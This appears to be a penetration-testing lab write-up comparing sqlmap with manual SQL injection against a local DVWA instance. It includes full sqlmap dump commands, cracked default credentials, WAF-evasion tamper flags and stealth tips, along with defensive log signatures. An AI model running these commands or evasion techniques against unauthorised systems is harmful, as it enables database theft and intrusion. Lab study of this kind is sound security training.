# SQLmap Analysis: Automated Exploitation vs Manual Testing

> **Understanding What Automation Provides — and What It Costs**

---

## What Is SQLmap

SQLmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It handles injection type detection, payload generation, data extraction, and hash cracking automatically.

**Version used:** sqlmap (latest stable)
**Target:** DVWA (Security: Low)
**Documentation:** https://sqlmap.org/

---

## Command Used

```bash
sqlmap \
  -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=your_session_cookie_here; security=low" \
  --batch \
  --dbs \
  --tables \
  --dump
```

### Flag Breakdown

| Flag | Purpose | Notes |
|------|---------|-------|
| `-u "[URL]"` | Target URL with injectable parameter | `id=1` is the injection point |
| `--cookie="..."` | Session authentication | Required — DVWA enforces login |
| `--batch` | Auto-answer all interactive prompts | Use for unattended runs |
| `--dbs` | Enumerate all accessible databases | First enumeration step |
| `--tables` | Enumerate tables in each database | Runs after --dbs |
| `--dump` | Extract all table contents | Runs after --tables |

### Why the Cookie Is Mandatory

DVWA requires authentication. Without a valid `PHPSESSID`, every request redirects to `login.php` and sqlmap receives the login page HTML — no injection point accessible.

**Obtain cookie from browser:**
```
1. Login to DVWA in browser
2. Open DevTools → Application → Cookies → 127.0.0.1
3. Copy PHPSESSID value
4. Paste into --cookie flag
```

### Staged Approach (Professional Alternative)

Running `--dbs --tables --dump` in one command generates maximum traffic. For lower-noise assessment, run in stages:

```bash
# Stage 1: Identify databases only
sqlmap -u "[URL]" --cookie="[cookie]" --batch --dbs

# Stage 2: Enumerate tables in target database
sqlmap -u "[URL]" --cookie="[cookie]" --batch -D dvwa --tables

# Stage 3: Dump specific table only
sqlmap -u "[URL]" --cookie="[cookie]" --batch -D dvwa -T users --dump
```

Staged approach: lower total request count, easier to explain in client report.

---

## Output Summary

### Injection Types Detected

sqlmap detected **four** injection types against DVWA Low:

| Type | Technique | Noise Level |
|------|-----------|-------------|
| **UNION query** | Appends UNION SELECT | Medium |
| **Error-based** | Extracts data via error messages | Medium |
| **Boolean-based blind** | Infers data from TRUE/FALSE | Low per request, high total |
| **Time-based blind** | Infers data from SLEEP() delays | Low per request, high total |

**Why four types?** sqlmap tests all applicable types and reports which worked. DVWA Low is unfiltered — all classic techniques succeed. A hardened application might only be exploitable via one or two.

### Database Enumeration

```
available databases:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
```

**Note:** sqlmap lists ALL databases the DB user can see. `information_schema`, `mysql`, and `performance_schema` are MySQL system databases — irrelevant for this engagement. Target: `dvwa`.

### Table Enumeration

```
Database: dvwa
[2 tables]
+------------+
| guestbook  |
| users      |
+------------+
```

Matches manual enumeration from Phase 5b.

### Data Dump with Automatic Hash Cracking

sqlmap automatically identifies MD5 hashes and attempts to crack them using its built-in wordlist:

```
Database: dvwa
Table: users
[5 entries]
+---------+---------+----------------------------------+
| user    | password (cracked)                         |
+---------+---------+----------------------------------+
| admin   | password (5f4dcc3b5aa765d61d8327deb882cf99)|
| gordonb | abc123   (e99a18c428cb38d5f260853678922e03) |
| 1337    | charley  (8d3533d75ae2c3966d7e0d4fcc69216b) |
| pablo   | letmein  (0d107d09f5bbe40cade3de5c71e9e9b7) |
| smithy  | password (5f4dcc3b5aa765d61d8327deb882cf99) |
+---------+---------+----------------------------------+
```

Identical to manual extraction results. Confirms manual methodology was correct.

---

## Traffic Comparison: SQLmap vs Manual vs Python Script

### Request Count Analysis

| Method | Requests Sent | Detectable Pattern |
|--------|--------------|-------------------|
| **Manual (12 payloads)** | ~12 | Slow, human-paced, hard to distinguish from normal browsing |
| **Python script (3 stages)** | 3 | Minimal footprint, only extracts targeted data |
| **SQLmap `--dump` (full)** | 500-2000+ | Automated sweep pattern, high velocity |
| **SQLmap staged (`-T users`)** | 100-500 | Reduced but still recognizable |

### What Generates SQLmap's Traffic

sqlmap sends hundreds of requests because it:
1. Tests multiple injection types simultaneously
2. Probes every parameter in the URL
3. Enumerates all databases, not just the target
4. Dumps every column of every table
5. Retries failed requests
6. Runs verification probes after detection

### Key Insight: Noise Is About Request Count, Not Tool

A Python script that loops through 1000 payloads creates the same detection risk as sqlmap. A sqlmap run with `-T users --dump` targeting one table is quieter than a broad `--dump`. The determining factor is the **number of requests**, not the tool generating them.

---

## Manual vs Automated: Professional Comparison

### When Manual Is Required

```
Situation 1: WAF Present
  sqlmap's payloads have known signatures (User-Agent, payload patterns)
  Modern WAFs block sqlmap by signature within seconds
  Manual payloads: custom-crafted, no signature to match

Situation 2: Edge Case Injection Points
  Non-standard parameters (custom headers, JSON body, XML)
  Unusual database configurations
  Requires understanding the query structure to craft precise payload

Situation 3: Client Explanation
  Client asks: "What exactly did you do?"
  Manual = can walk through each step, show each payload
  sqlmap = "the tool found it" (insufficient for professional report)

Situation 4: Stealth Required
  Silent initial discovery phase
  12 requests over 10 minutes = normal user behavior
  sqlmap sweep = instant SOC alert
```

### When SQLmap Is Appropriate

```
Situation 1: Confirmed Vulnerability, Full Extraction Needed
  Manual confirmed injection → sqlmap handles bulk data dump
  Client wants proof of full database exposure
  Speed matters: demo in constrained time window

Situation 2: Multiple Parameters to Test
  Application has 50 parameters
  Manual testing each = days of work
  sqlmap scan across all parameters = hours

Situation 3: Comprehensive Injection Type Coverage
  sqlmap tests union, error, boolean, time, stacked queries
  Ensures no injection type is missed by human oversight
```

### Professional Workflow (This Week's Approach)

```
Step 1: Manual (Discovery Phase)
  → Confirm injection exists
  → Identify column count and positions
  → Extract initial credentials
  → Understand the application's SQL behavior
  Cost: ~12 requests, very quiet

Step 2: SQLmap (Verification + Full Extraction)
  → Confirm manual findings are accurate
  → Detect additional injection types
  → Extract complete database contents efficiently
  Cost: 500-2000 requests, detectable

Step 3: Python Script (Targeted Repeat Extraction)
  → Targeted extraction of specific data only
  → Automated but controlled noise level (3 requests)
  → Reproducible for client demonstration
  Cost: 3 requests per run, minimal footprint
```

---

## SQLmap Flags Reference

### Commonly Used Flags

```bash
# Target specification
-u "[URL]"                    # Target URL
--data="[POST body]"          # For POST parameters
--cookie="[cookie]"           # Session cookie
--headers="[headers]"         # Custom headers

# Enumeration
--dbs                         # List all databases
-D [database] --tables        # List tables in database
-D [database] -T [table] --dump  # Dump specific table
--dump-all                    # Dump everything (very noisy)

# Detection tuning
--level=1-5                   # Test depth (default: 1)
--risk=1-3                    # Payload aggressiveness (default: 1)
--technique=BEUSTQ            # Specify injection types
                              # B=Boolean, E=Error, U=Union,
                              # S=Stacked, T=Time, Q=Inline

# Evasion
--tamper=[script]             # Apply payload obfuscation
--random-agent                # Randomize User-Agent
--delay=N                     # Add N second delay between requests
--proxy="http://127.0.0.1:8080"  # Route through Burp Suite

# Output control
--batch                       # Auto-answer prompts (non-interactive)
--output-dir=[path]           # Save results to directory
```

### Evasion with --tamper (For WAF Bypass)

```bash
# Common tamper scripts
--tamper=space2comment         # Replace spaces with /**/
--tamper=randomcase            # Randomize SQL keyword case (SeLeCt)
--tamper=between               # Replace > with BETWEEN
--tamper=charencode            # URL-encode characters

# Combine multiple
--tamper=space2comment,randomcase,between
```

**When --tamper is not enough:** Highly customized WAF signatures require fully manual payload crafting. sqlmap tamper scripts use predictable transformation patterns that advanced WAFs learn to recognize.

---

## Detection: What Blue Team Sees

### SQLmap Traffic Signature in Logs

```
[04:45:01] GET /DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
[04:45:01] GET /DVWA/vulnerabilities/sqli/?id=1%27&Submit=Submit
[04:45:01] GET /DVWA/vulnerabilities/sqli/?id=1+AND+1%3D1&Submit=Submit
[04:45:01] GET /DVWA/vulnerabilities/sqli/?id=1+AND+1%3D2&Submit=Submit
[04:45:02] GET /DVWA/vulnerabilities/sqli/?id=1+ORDER+BY+1--+&Submit=Submit
[04:45:02] GET /DVWA/vulnerabilities/sqli/?id=1+ORDER+BY+2--+&Submit=Submit
[04:45:02] GET /DVWA/vulnerabilities/sqli/?id=1+ORDER+BY+3--+&Submit=Submit
... (continues for 500+ requests at machine speed)
```

**Detection indicators:**
- Request rate: 10-50 per second (machine speed)
- Parameter values: systematic SQL keyword progression
- User-Agent: `sqlmap/[version]` (unless `--random-agent` used)
- Pattern: immediate retry on each parameter variant

**Any modern IDS/WAF triggers within seconds of sqlmap starting.**

---

**Status:** Week 8 SQLmap Analysis | Manual vs Automated Comparison Complete
